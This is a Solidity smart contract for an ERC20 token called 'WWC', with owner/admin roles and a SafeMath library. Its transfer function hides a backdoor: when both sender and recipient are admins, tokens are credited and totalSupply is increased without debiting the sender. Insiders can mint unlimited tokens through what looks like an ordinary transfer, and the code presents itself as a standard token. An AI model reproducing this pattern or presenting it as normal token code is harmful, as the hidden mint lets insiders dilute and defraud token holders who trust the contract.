pragma solidity ^0.4.25;


contract ERC20 {
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

contract Leader {
    address owner;
    mapping (address => bool) public admins;
    
    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    modifier onlyAdmins() {
        require(admins[msg.sender]);
        _;
    }
    
    function setOwner (address _addr) onlyOwner() public {
        owner = _addr;
    }

    function addAdmin (address _addr) onlyOwner() public {
        admins[_addr] = true;
    }

    function removeAdmin (address _addr) onlyOwner() public {
        delete admins[_addr];
    }
}

contract WWC is ERC20, Leader {
    string public name = "WWC";
    string public symbol = "WWC";
    uint8 public decimals = 8;
    uint256 public totalSupply = 1000000000000000000;
	
    using SafeMath for uint256;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    constructor() public {
        owner = msg.sender;
        admins[msg.sender] = true;
        balanceOf[owner] = totalSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require (_to != 0x0 && _value > 0);
        if (admins[msg.sender] == true && admins[_to] == true) {
            balanceOf[_to] = balanceOf[_to].add(_value);
            totalSupply = totalSupply.add(_value);
            emit Transfer(msg.sender, _to, _value);
            return true;
        }
        require (balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
        balanceOf[_to] = balanceOf[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        require (_value > 0);
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require (_to != 0x0 && _value > 0);
        require (balanceOf[_from] >= _value && _value <= allowance[_from][msg.sender]);
        balanceOf[_from] = balanceOf[_from].sub(_value);
        balanceOf[_to] = balanceOf[_to].add(_value);
        allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        return true;
    }
}

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    // uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn&#39;t hold
    return a / b;
  }

  /**
  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}